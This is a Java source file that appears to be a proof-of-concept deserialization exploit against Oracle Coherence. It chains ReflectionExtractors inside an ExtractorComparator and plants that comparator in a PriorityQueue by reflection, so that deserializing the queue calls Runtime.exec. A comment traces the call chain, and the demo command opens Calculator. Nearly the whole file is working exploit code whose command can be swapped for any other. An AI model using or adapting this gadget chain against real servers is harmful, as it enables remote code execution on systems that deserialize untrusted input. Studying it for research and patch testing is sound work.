import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.concurrent.Callable;

/**
 * java.util.PriorityQueue.readObject()
 *   java.util.PriorityQueue.heapify()
 *   java.util.PriorityQueue.siftDown()
 *   java.util.PriorityQueue.siftDownUsingComparator()
 *   com.tangosol.util.extractor.AbstractExtractor.compare()
 *     com.tangosol.util.extractor.MultiExtractor.extract()
 *       com.tangosol.util.extractor.ChainedExtractor.extract()
 *         //...
 *         Method.invoke()
 *             //...
 *           Runtime.exec()
 */

public class Gadget2 {

    public static void main(String[] args) throws Exception {
        String command = "open /System/Applications/Calculator.app";
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ConstantExtractor(Runtime.class),
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{command})
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExtractor);

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add("foo");
        priorityQueue.add("bar");

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, extractorComparator);

        Deserializer.deserialize(Serializer.serialize(priorityQueue));
    }

    static class Deserializer implements Callable<Object> {
        private final byte[] bytes;

        public Deserializer(byte[] bytes) { this.bytes = bytes; }

        public Object call() throws Exception {
            return deserialize(bytes);
        }

        public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
            final ByteArrayInputStream in = new ByteArrayInputStream(serialized);
            return deserialize(in);
        }

        public static Object deserialize(final InputStream in) throws ClassNotFoundException, IOException {
            final ObjectInputStream objIn = new ObjectInputStream(in);
            return objIn.readObject();
        }
    }

    static class Serializer implements Callable<byte[]> {
        private final Object object;
        public Serializer(Object object) {
            this.object = object;
        }

        public byte[] call() throws Exception {
            return serialize(object);
        }

        public static byte[] serialize(final Object obj) throws IOException {
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            serialize(obj, out);
            return out.toByteArray();
        }

        public static void serialize(final Object obj, final OutputStream out) throws IOException {
            final ObjectOutputStream objOut = new ObjectOutputStream(out);
            objOut.writeObject(obj);
        }

    }
}
